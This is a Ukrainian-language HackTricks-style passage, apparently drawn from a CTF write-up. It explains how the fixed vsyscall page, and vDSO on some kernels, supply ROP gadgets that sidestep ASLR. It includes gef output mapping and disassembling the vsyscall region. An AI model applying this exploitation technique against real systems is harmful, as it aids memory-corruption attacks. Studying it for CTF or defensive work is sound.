–ú–µ—Ö–∞–Ω—ñ–∑–º **`vsyscall`** —Å–ª—É–∂–∏—Ç—å –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –ø–µ–≤–Ω—ñ —Å–∏—Å—Ç–µ–º–Ω—ñ –≤–∏–∫–ª–∏–∫–∏ –≤ –ø—Ä–æ—Å—Ç–æ—Ä—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ö–æ—á–∞ –≤–æ–Ω–∏ —î —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç–∞–ª—å–Ω–æ—é —á–∞—Å—Ç–∏–Ω–æ—é —è–¥—Ä–∞. –ö—Ä–∏—Ç–∏—á–Ω–∞ –ø–µ—Ä–µ–≤–∞–≥–∞ **vsyscalls** –ø–æ–ª—è–≥–∞—î –≤ —ó—Ö **—Ñ—ñ–∫—Å–æ–≤–∞–Ω–∏—Ö –∞–¥—Ä–µ—Å–∞—Ö**, —è–∫—ñ –Ω–µ –ø—ñ–¥–ª—è–≥–∞—é—Ç—å **ASLR** (–≤–∏–ø–∞–¥–∫–æ–≤—ñ–π —Ä–æ–∑–∫–ª–∞–¥—Ü—ñ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç–æ—Ä—É). –¶—è —Ñ—ñ–∫—Å–æ–≤–∞–Ω–∞ –ø—Ä–∏—Ä–æ–¥–∞ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∏—Ç–æ–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —â–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —Å–≤–æ—ó –∞–¥—Ä–µ—Å–∏ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ó—Ö —É –µ–∫—Å–ø–ª–æ–π—Ç—ñ.\
–û–¥–Ω–∞–∫ —Ç—É—Ç –Ω–µ –±—É–¥–µ –∑–Ω–∞–π–¥–µ–Ω–æ —Å—É–ø–µ—Ä —Ü—ñ–∫–∞–≤–∏—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤ (—Ö–æ—á–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç `ret;`)

(–ù–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ —ñ –∫–æ–¥ —î [**–∑ —Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation))

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å—É `0xffffffffff600800` –≤ –µ–∫—Å–ø–ª–æ–π—Ç—ñ. –•–æ—á–∞ —Å–ø—Ä–æ–±–∞ —Å—Ç—Ä–∏–±–Ω—É—Ç–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–æ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó `ret` –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –Ω–µ—Å—Ç–∞–±—ñ–ª—å–Ω–æ—Å—Ç—ñ –∞–±–æ –∑–±–æ—ó–≤ –ø—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤, —Å—Ç—Ä–∏–±–æ–∫ –Ω–∞ –ø–æ—á–∞—Ç–æ–∫ `syscall`, –Ω–∞–¥–∞–Ω–æ–≥–æ —Å–µ–∫—Ü—ñ—î—é **vsyscall**, –º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏—Å—è —É—Å–ø—ñ—à–Ω–∏–º. –û–±–µ—Ä–µ–∂–Ω–æ —Ä–æ–∑–º—ñ—â—É—é—á–∏ –≥–∞–¥–∂–µ—Ç **ROP**, —è–∫–∏–π –≤–µ–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ —Ü—ñ—î—ó –∞–¥—Ä–µ—Å–∏ **vsyscall**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –¥–æ—Å—è–≥—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –æ–±—Ö–æ–¥–∏—Ç–∏ **ASLR** –¥–ª—è —Ü—ñ—î—ó —á–∞—Å—Ç–∏–Ω–∏ –µ–∫—Å–ø–ª–æ–π—Ç—É.
```
ef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef‚û§  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤–∏–º **–æ–±—ñ–π—Ç–∏ ASLR, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ vdso**, —è–∫—â–æ —è–¥—Ä–æ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–µ –∑ CONFIG\_COMPAT\_VDSO, –æ—Å–∫—ñ–ª—å–∫–∏ –∞–¥—Ä–µ—Å–∞ vdso –Ω–µ –±—É–¥–µ –≤–∏–ø–∞–¥–∫–æ–≤–æ—é. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
